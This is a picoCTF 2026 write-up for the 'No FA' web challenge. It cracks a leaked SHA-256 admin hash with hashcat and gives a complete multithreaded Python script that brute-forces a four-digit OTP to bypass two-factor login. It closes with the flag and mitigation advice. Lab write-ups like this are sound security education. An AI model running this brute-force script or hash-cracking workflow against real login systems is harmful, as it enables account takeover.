# No FA — picoCTF 2026

## Challenge Information

| Field          | Details                                      |
| -------------- | -------------------------------------------- |
| **Platform**   | picoCTF 2026                                 |
| **Challenge**  | No FA                                        |
| **Category**   | Web Exploitation                             |
| **Difficulty** | Medium                                       |
| **Objective**  | Gain access as `admin` and retrieve the flag |

---

## 1. Challenge Overview

The challenge presents a web application with a login page and a two-factor authentication mechanism.

The challenge description mentions that **some data has been leaked**, with links to the application source code and the leaked data.

The main goal is to obtain an authenticated `admin` session and access the flag.

---

# 2. Source Code Analysis

The application is written using Flask.

The important routes are:

```python
@app.route("/")
def home():
    if 'username' not in session or session['logged'] == 'false':
        flash('Please login to access this page', 'red')
        return redirect(url_for('login'))
    
    flag = "No flag for you!!"
    if session.get('username') == 'admin':
        flag = os.getenv('FLAG')
    
    return render_template("index.html", flag=flag)
```

This immediately tells us that the flag is displayed whenever the session contains:

```python
session['username'] == 'admin'
```

and:

```python
session['logged'] == 'true'
```

Therefore, the objective is ultimately to obtain a valid authenticated admin session.

---

# 3. Analyze the Login Function

The login route retrieves a user from the database:

```python
user = db.get_user_by_username(username)
```

The submitted password is hashed using SHA-256:

```python
hashlib.sha256(password.encode()).hexdigest()
```

and compared against the value stored in the database:

```python
if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
```

If the account has 2FA enabled, the application generates an OTP:

```python
otp = str(random.randint(1000, 9999))

session['otp_secret'] = otp
session['otp_timestamp'] = time.time()
session['username'] = username
session['logged'] = 'false'
```

The user is then redirected to `/two_fa`.

This gives us two important pieces of information:

* Passwords are stored as SHA-256 hashes.
* The OTP consists of only four digits.

---

# 4. Examine the Leaked Database

The leaked file was a `.db` file.

First, identify the file:

```bash
file users.db
```

The database could then be opened using SQLite:

```bash
sqlite3 users.db
```

Inside SQLite:

```sql
.tables
```

The database contained a `users` table.

The schema could be inspected with:

```sql
.schema users
```

The relevant structure was:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    two_fa BOOLEAN NOT NULL DEFAULT 0
);
```

To inspect the stored accounts:

```sql
SELECT * FROM users;
```

The important entry was the `admin` account:

```text
admin | iamadmin@nfs.com | c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67 | 1
```

The final value is:

```text
two_fa = 1
```

meaning that 2FA is enabled for the administrator.

The password hash was:

```text
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
```

---

# 5. Crack the Admin Password

From the source code, we know the application uses SHA-256:

```python
hashlib.sha256(password.encode()).hexdigest()
```

SHA-256 is Hashcat mode `1400`.

Save the hash:

```bash
echo 'c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67' > hash.txt
```

Then use Hashcat with the `rockyou.txt` wordlist:

```bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

The recovered password was:

```text
apple@@123
```

We now had:

```text
Username: admin
Password: apple@@123
```

---

# 6. Login as Admin

Using the recovered credentials against the challenge:

```text
Username: admin
Password: apple@@123
```

the login succeeded.

However, because the admin account has:

```text
two_fa = 1
```

the application redirected us to:

```text
/two_fa
```

The browser displayed an OTP verification page.

At this point, the password authentication had been bypassed, but we still needed the OTP.

---

# 7. Analyze the 2FA Implementation

The OTP is generated using:

```python
otp = str(random.randint(1000, 9999))
```

Therefore, the possible values are:

```text
1000 - 9999
```

This gives only:

```text
9000
```

possible OTPs.

The verification code is:

```python
@app.route('/two_fa', methods=['GET', 'POST'])
def two_fa():
    if request.method == 'POST':
        otp = request.form['otp']
        stored_otp = session['otp_secret']
        timestamp = session.get('otp_timestamp')

        if stored_otp and otp == stored_otp and (time.time() - timestamp) < 120:
            session['logged'] = 'true'
            flash('Login successful!', 'green')
            return redirect(url_for('home'))
        else:
            flash('Invalid OTP or OTP expired', 'red')
            return render_template('2fa.html')
```

There is no:

* Maximum attempt count
* Rate limiting
* Account lockout
* CAPTCHA
* Progressive delay

The only protection is:

```python
(time.time() - timestamp) < 120
```

meaning the OTP is valid for two minutes.

Therefore, the OTP can potentially be brute-forced.

---

# 8. Initial Attempt — Burp Intruder

The first approach was using **Burp Suite Intruder**.

The OTP parameter was marked:

```http
otp=§0000§&action=
```

The payload range was configured as:

```text
From: 1000
To:   9999
Step: 1
```

This produced 9,000 possible values.

However, all the responses initially returned:

```text
HTTP/1.1 200 OK
```

and the response lengths were effectively identical.

This made it difficult to identify the successful request based only on HTTP status or response length.

More importantly, the 2FA mechanism relies on the Flask session:

```python
stored_otp = session['otp_secret']
```

so every brute-force request must use the correct session associated with the current OTP.

---

# 9. Investigating the Flask Session

A single invalid OTP was tested using Python.

The response showed:

```text
OTP: 200
```

and:

```text
Content-Length: 4193
```

It also returned a new:

```http
Set-Cookie: session=...
```

This was an important observation.

The application uses Flask's session cookie to maintain the OTP state, so the brute-force requests had to preserve the appropriate session.

---

# 10. First Python Brute-Force Attempt

A simple sequential Python script was created using `requests`.

The script successfully logged in:

```text
Login: 302
Session: .eJ...
2FA page: 200
```

However, it was extremely slow.

The measured speed was approximately:

```text
1.4 requests/sec
```

At that rate, testing all 9,000 possibilities would take far longer than the 120-second OTP lifetime.

Therefore, a sequential brute-force attack was not practical.

---

# 11. Concurrent OTP Brute Force

The solution was to send multiple OTP requests concurrently.

Python's `ThreadPoolExecutor` was used to create multiple workers.

The important idea was to preserve the session obtained during the successful admin login and send the same session cookie with each OTP attempt.

The final script was:

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

URL = "http://foggy-cliff.picoctf.net:57474"
USERNAME = "admin"
PASSWORD = "apple@@123"

s = requests.Session()

# Login
r = s.post(
    URL + "/login",
    data={
        "username": USERNAME,
        "password": PASSWORD
    },
    allow_redirects=False,
    timeout=5
)

print("[+] Login:", r.status_code)

if r.status_code != 302:
    print("[-] Login failed")
    exit()

# Preserve the Flask session created during login
session_cookie = s.cookies.get("session")

if not session_cookie:
    print("[-] No session cookie received")
    exit()

print("[+] Session obtained")
print("[*] Starting parallel OTP attack...")


def try_otp(otp):
    try:
        r = requests.post(
            URL + "/two_fa",
            data={
                "otp": f"{otp:04d}",
                "action": ""
            },
            headers={
                "Cookie": f"session={session_cookie}"
            },
            allow_redirects=False,
            timeout=5
        )

        # Correct OTP redirects to /
        if r.status_code == 302:
            return otp

    except requests.RequestException:
        pass

    return None


start = time.time()

with ThreadPoolExecutor(max_workers=50) as executor:

    futures = {
        executor.submit(try_otp, otp): otp
        for otp in range(1000, 10000)
    }

    for future in as_completed(futures):

        result = future.result()

        if result is not None:

            elapsed = time.time() - start

            print()
            print(f"[+] OTP FOUND: {result:04d}")
            print(f"[+] Time: {elapsed:.2f} seconds")

            # Verify the discovered OTP
            r = s.post(
                URL + "/two_fa",
                data={
                    "otp": f"{result:04d}",
                    "action": ""
                },
                allow_redirects=False,
                timeout=5
            )

            print("[+] Verification:", r.status_code)
            print("[+] Redirect:", r.headers.get("Location"))

            # Access the authenticated home page
            r = s.get(URL + "/", timeout=5)

            print()
            print("[+] HOME RESPONSE:")
            print(r.text)

            executor.shutdown(wait=False, cancel_futures=True)
            break

    else:
        print("[-] OTP not found")
```

The concurrency allowed the possible OTP space to be tested much faster than the original sequential implementation.

---

# 12. Finding the OTP

The attack eventually returned:

```text
[+] OTP FOUND: 6752
[+] Time: 91.22 seconds
[+] Verification: 302
[+] Redirect: /
```

The successful `302` response was significant because the application performs:

```python
return redirect(url_for('home'))
```

when the OTP is correct.

The discovered OTP was:

```text
6752
```

---

# 13. Access the Home Page

After successful 2FA verification, the application set:

```python
session['logged'] = 'true'
```

The home route then checked:

```python
if session.get('username') == 'admin':
    flag = os.getenv('FLAG')
```

The authenticated response contained:

```html
<h1>Welcome !!</h1>

<p>picoCTF{n0_r4t3_n0_4uth_41b9d45a}</p>
```

---

# 14. Flag

```text
picoCTF{n0_r4t3_n0_4uth_41b9d45a}
```

---

# 15. Attack Chain

The complete attack chain was:

```text
Leaked database
       │
       ▼
Extract admin password hash
       │
       ▼
Crack SHA-256 hash
       │
       ▼
Recover admin password
       │
       ▼
Login as admin
       │
       ▼
Reach 2FA
       │
       ▼
Analyze OTP generation
       │
       ▼
4-digit OTP + no rate limiting
       │
       ▼
Concurrent brute force
       │
       ▼
OTP = 6752
       │
       ▼
Successful authentication
       │
       ▼
Access /
       │
       ▼
FLAG
```

---

# 16. Vulnerabilities Identified

## 16.1 Exposed Database

The leaked database contained sensitive authentication information:

```text
username
email
password hash
2FA status
```

Exposing this database allowed the admin password hash to be recovered.

---

## 16.2 Weak Password Hashing

Passwords were protected only with SHA-256:

```python
hashlib.sha256(password.encode()).hexdigest()
```

SHA-256 is not appropriate for password storage because it is designed to be fast.

A password hashing algorithm such as **Argon2id**, **bcrypt**, or **scrypt** should be used with a unique salt.

---

## 16.3 Small OTP Keyspace

The application generates:

```python
random.randint(1000, 9999)
```

This creates only 9,000 possible OTP values.

A four-digit OTP has a very small search space.

---

## 16.4 No Rate Limiting

The application accepts repeated OTP attempts without introducing a delay or blocking the user.

An attacker can therefore automate thousands of attempts.

---

## 16.5 No Attempt Limit

There is no counter such as:

```python
attempts += 1
```

and no maximum number of failed attempts.

A secure application should invalidate the OTP after a small number of failed attempts.

---

## 16.6 OTP Stored in the Client-Side Flask Session

The OTP is stored in:

```python
session['otp_secret']
```

Although Flask signs its session cookie, storing authentication state in the client-side session increases the importance of protecting the Flask `SECRET_KEY`.

The application should carefully protect and rotate its signing secret.

---

# 17. Recommended Mitigations

A secure implementation should:

### Use a password hashing algorithm designed for passwords

For example:

```python
from argon2 import PasswordHasher

ph = PasswordHasher()

password_hash = ph.hash(password)
```

and verify with:

```python
ph.verify(password_hash, password)
```

---

### Use a cryptographically secure OTP generator

Instead of relying on a general-purpose random generator:

```python
random.randint(1000, 9999)
```

use a cryptographically secure mechanism.

For example:

```python
import secrets

otp = f"{secrets.randbelow(1000000):06d}"
```

---

### Implement rate limiting

For example:

```text
Maximum 5 OTP attempts
       ↓
Temporary lockout
       ↓
Require a new OTP
```

---

### Invalidate the OTP after successful verification

After successful authentication:

```python
session.pop('otp_secret', None)
session.pop('otp_timestamp', None)
```

This prevents reuse of the OTP.

---

### Protect leaked data

Database backups and development artifacts should never be publicly accessible.

Sensitive files should also be excluded from source repositories using appropriate `.gitignore` rules and access controls.

---

# 18. Key Lessons

This challenge demonstrates that **2FA is only as strong as its implementation**.

Even though the admin account had 2FA enabled, the following weaknesses made it possible to bypass the protection:

```text
Leaked credentials
        +
Weak password hashing
        +
Only 9,000 OTP possibilities
        +
No rate limiting
        +
No attempt limit
```

The most important lesson is that implementing 2FA is not enough by itself. Authentication systems must also enforce **rate limiting, attempt limits, secure credential storage, secure randomness, and proper secret management**.

---

## Conclusion

The challenge was solved by analyzing the provided Flask source code and leaked SQLite database, extracting and cracking the administrator's SHA-256 password hash, and then exploiting the lack of OTP rate limiting.

The admin password was recovered as:

```text
apple@@123
```

The four-digit OTP was brute-forced as:

```text
6752
```

This resulted in an authenticated administrator session and exposed the final flag:

```text
picoCTF{n0_r4t3_n0_4uth_41b9d45a}
```

**Final flag: `picoCTF{n0_r4t3_n0_4uth_41b9d45a}`**
